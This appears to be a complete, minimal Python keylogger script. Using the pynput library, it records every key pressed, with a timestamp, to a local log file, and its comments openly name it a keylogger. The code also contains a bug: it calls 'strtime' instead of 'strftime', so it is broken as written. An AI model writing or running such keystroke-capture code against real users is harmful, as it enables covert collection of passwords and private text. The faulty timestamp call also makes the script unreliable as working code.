from pynput import keyboard
from datetime import datetime

# log file path
log_file = "simple_log.txt"

#write key with timestamp
def write_to_file(key):
    time_stamp = datetime.now().strtime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        try:
            f.write(f"{time_stamp} - {key.char}\n")
        except AttributeError:
            f.write(f"{time_stamp} - [{key}]\n")

# on key press, write to file
def on_press(key):
    write_to_file(key)

# start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
